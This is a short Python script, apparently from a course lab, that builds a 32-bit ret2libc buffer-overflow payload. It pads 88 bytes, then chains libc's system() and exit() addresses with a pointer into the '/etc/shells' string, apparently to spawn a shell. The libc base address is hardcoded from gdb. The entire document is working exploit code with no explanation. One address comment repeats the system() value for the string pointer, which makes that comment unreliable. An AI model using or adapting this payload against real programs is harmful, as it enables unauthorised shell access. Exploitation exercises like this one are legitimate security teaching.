#!/usr/bin/env python3
import struct
import sys
from pwn import ELF

offset = 88 # Ajustar segun lo hallado en el lab1
libc = ELF("/usr/lib32/libc.so.6", checksec=False )  # usa la misma que el ejecutable
system_offset = libc.symbols["system"]
exit_offset = libc.symbols["exit"]
command_offset = next(libc.search(b"/etc/shells")) + 0x9

#Obtenemos la base de la libc con gdb "info proc mappings"
base = 0xf7cf2000
system_addr = struct.pack("<I",(base + system_offset))      # 0xf7e12360
exit_addr = struct.pack("<I",(base + exit_offset))          # 0xf7e04ec0
command_addr  = struct.pack("<I", (base + command_offset))  # 0xf7e12360

payload = b"A" * offset
payload += system_addr
payload += exit_addr # Relleno
payload += command_addr

sys.stdout.buffer.write(payload)